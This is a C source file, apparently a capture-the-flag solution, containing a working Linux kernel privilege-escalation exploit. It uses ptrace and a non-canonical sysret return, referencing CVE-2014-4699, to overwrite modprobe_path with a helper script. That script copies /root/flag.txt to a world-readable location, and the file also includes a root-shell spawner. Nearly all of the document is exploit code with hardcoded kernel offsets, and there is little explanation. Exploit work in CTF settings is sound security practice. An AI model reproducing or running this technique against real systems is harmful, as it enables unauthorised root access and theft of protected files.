#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <syscall.h>
#include <unistd.h>
#include <sys/ucontext.h>
#include "prefetch.h"

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                    \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                     \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                  \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)


#define o(x) (kbase + x)

unsigned long user_cs, user_ss, user_eflags, user_sp, user_ip;

void get_shell() {
    int uid;
    logd("root?");
    if (!(uid = getuid())) {
        logi("root get!!");
        execl("/bin/sh", "sh", NULL);
    } else {
        die("gain root failed, uid: %d", uid);
    }
}

void saveStatus(void) {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_eflags;"
            );

    user_ip = (uint64_t)&get_shell;
    user_sp = 0xf000 +
              (uint64_t)mmap(0, 0x10000, 6, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

void bind_cpu(int cpu_idx) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu_idx, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("sched_setaffinity: %m");
    }
}

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

void* map;
pid_t hbp_pid;
uint64_t kbase;
uint64_t gsbase, phys;
int fd;

size_t modprobe_path = 0x103b840;
size_t core_pattern = 0x112b6c0;
ucontext_t ctx;
struct user_regs_struct regs;


void update_addr(){
    modprobe_path = o(modprobe_path);
    core_pattern = o(core_pattern);
}


// https://duasynt.com/blog/cve-2014-4699-linux-kernel-ptrace-sysret-analysis
void do_sysret(uint64_t addr, struct user_regs_struct *regs_arg) {
    struct user_regs_struct regs;
    int status;
    pid_t chld;

    memcpy(&regs, regs_arg, sizeof(regs));

    if ((chld = fork()) < 0) {
        perror("fork");
        exit(1);
    }

    if (chld == 0) {
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0) {
            perror("PTRACE_TRACEME");
            exit(1);
        }

	asm volatile("wrgsbase %0" : : "r" (gsbase));

        raise(SIGSTOP);
        fork();
        return 0;
    }

    waitpid(chld, &status, 0);

    ptrace(PTRACE_SETOPTIONS, chld, 0, PTRACE_O_TRACEFORK);
    ptrace(PTRACE_CONT, chld, 0, 0);

    waitpid(chld, &status, 0);

    regs.rip = 0x8000000000000000; // not-canonical
    regs.rcx = 0x8000000000000000; // not-canonical
    regs.rsp = addr;

    // necessary stuff
    regs.eflags = 0x246;
    regs.r11 = 0x246;
    regs.ss = 0x2b;
    regs.cs = 0x33;

    // just needs to be bad (> TASK_MAX) so the value set by wrgsbase isn't overwritten
    regs.gs_base = -1;

    ptrace(PTRACE_SETREGS, chld, NULL, &regs);
    ptrace(PTRACE_CONT, chld, 0, 0);
    ptrace(PTRACE_DETACH, chld, 0, 0);
}


int main(int argc, char *argv[])
{
    /*
    bp 0xFFFFFFFF81A000AF
    bp 0xffffffff81a00191
    bp 0xFFFFFFFF81A011C0

    b entry_SYSRETQ_unsafe_stack
    b asm_exc_page_fault
    b exc_general_protection

    */

    saveStatus();
    bind_cpu(0);

    // trigger file for modprobe
    system("echo -ne \"\xff\xff\xff\xff\" >> /tmp/bad");
    system("chmod 777 /tmp/bad");

    // called by modprobe
    system("echo -ne \"#!/bin/sh\ncp /root/flag.txt /tmp/heckyeah\nchown ctf:ctf /tmp/heckyeah\" > /tmp/x");
    system("chmod 777 /tmp/x");

    kbase = 0xffffffff81000000;
    logi("kbase: 0x%llx", kbase);
    phys = 0xffff888000000000;
    logi("phys: 0x%llx", phys);
    gsbase = phys + 0x13bc00000;
    logi("gsbase: 0x%llx", gsbase);

    update_addr();

    // fill registers with new modprobe path
    uint64_t new_modprobe = 0x00782f706d742f; // /tmp/x
    for (int i = 0; i < sizeof(regs)/sizeof(new_modprobe); i++) {
	    ((uint64_t *)&regs)[i] = new_modprobe;
    }

    // position register dump over modprobe_path
    do_sysret(modprobe_path + 0xa8, &regs);

    // fixup corrupted init_ucounts
    regs.rbp = 0x0000002d00000000;
    regs.r12 = kbase + 0x103a320;
    regs.r13 = kbase + 0x1640160;
    regs.r14 = phys + 0x100049600;

    // position register dump over init_ucounts
    logd("restore init_ucounts");
    do_sysret(modprobe_path-0xd8, &regs);

    logd("trigger...");
    // trigger modprobe
    system("/tmp/bad");

    // get flag
    system("cat /tmp/heckyeah");

    return 0;
}